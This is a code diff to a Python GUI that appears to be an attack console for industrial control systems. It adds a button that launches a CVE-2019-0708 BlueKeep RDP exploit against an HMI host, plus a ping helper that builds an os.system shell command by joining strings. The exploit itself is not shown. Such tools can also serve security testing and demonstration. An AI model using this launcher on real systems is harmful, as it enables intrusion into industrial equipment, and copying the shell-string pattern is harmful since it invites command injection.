@@ -1,7 +1,8 @@
 import sys
 import traceback
+import os
 from PyQt5 import QtWidgets, uic, QtCore
-from lib import attack
+from lib import attack, bluekeep
 from time import sleep
 
 # CONSTANTS
@@ -62,6 +63,12 @@ class Ui(QtWidgets.QFrame):
         return str(self.spinbox_ip_2_1.value()) + '.' + str(self.spinbox_ip_2_2.value()) + '.' + str(
             self.spinbox_ip_2_3.value()) + '.' + str(self.spinbox_ip_2_4.value())
 
+    def ping(self, ip):
+        if os.system("ping -n 1 -w 1 " + ip) == 0:
+            return "Online"
+        else:
+            return "Offline"
+
     def print_output(self, message):
         self.show_log(message)
 
@@ -76,14 +83,16 @@ class Ui(QtWidgets.QFrame):
         self.threadpool.start(worker2)
 
     def status_plc(self):
-        while True:
+        while not self.exit_flag:
             self.label_statusvalue.setText(attack.plc_status_check(self.get_plc_ip()))
             sleep(polling_interval)
+        print("PLC status polling stopped")
 
     def status_hmi(self):
-        while True:
-            self.label_statusvalue_2.setText(self.get_hmi_ip())
-            sleep(polling_interval)
+        while not self.exit_flag:
+            self.label_statusvalue_2.setText(self.ping(self.get_hmi_ip()))
+            sleep(polling_interval*2)
+        print("HMI status polling stopped")
 
     def moddisable(self, target):
         button_name = "pushbutton_moddisable"
@@ -180,15 +189,24 @@ class Ui(QtWidgets.QFrame):
         self.threadpool.start(worker)
 
     def cve_4(self, target):
-        self.show_log("Check [" + target + "]")
+        button_name = "pushbutton_cve_4"
+        self.pushbutton_cve_4.setEnabled(False)
+        self.show_log("Exploiting CVE-2019-0708 BlueKeep RDP vunlnerability "
+                      "Target [" + target + "]")
+        worker = Worker(bluekeep.cve_2019_0708, self.get_hmi_ip())
+        worker.signals.result.connect(self.print_output)
+        worker.signals.finished.connect(lambda: self.thread_complete(button_name))
+        self.threadpool.start(worker)
 
     def stop_thread(self):
         self.threadpool.globalInstance().waitForDone()
         self.threadpool.deleteLater()
 
+
     def __init__(self):
         super(Ui, self).__init__()
         uic.loadUi(ui_file, self)
+        self.exit_flag = False
         self.threadpool = QtCore.QThreadPool()
         self.status_update()
 
@@ -205,8 +223,8 @@ class Ui(QtWidgets.QFrame):
         self.pushbutton_cve_4.clicked.connect(lambda: self.cve_4(self.get_hmi_ip()))
 
     def closeEvent(self, event):
+        self.exit_flag = True
         self.stop_thread()
-        sys.exit(0)
 
 
 if __name__ == '__main__':
